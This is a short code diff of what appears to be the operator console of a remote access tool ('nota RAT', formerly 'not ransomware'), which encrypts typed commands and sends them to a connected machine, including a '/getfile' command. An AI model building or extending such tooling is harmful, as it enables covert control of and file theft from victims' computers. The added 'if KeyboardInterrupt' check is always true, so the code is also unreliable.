@@ -27,7 +27,7 @@ print("""
  | '_ \ / _ \| __/ _` | |  _  /   / /\ \ | |   
  | | | | (_) | || (_| | | | \ \  / ____ \| |   
  |_| |_|\___/ \__\__,_| |_|  \_\/_/    \_\_|                                                
-     not ransomware v 1.0 | fluffydolphin                             
+       nota RAT v 1.0 | fluffydolphin                             
 """)
 
 
@@ -51,6 +51,10 @@ while True:
         continue
     command = Fernet(key).encrypt(command.encode())
     client_socket.send(command)
+    if KeyboardInterrupt:
+        client_socket.close()
+        s.close()
+        break
     if command == "exit":
         break
     if command == "/getfile":
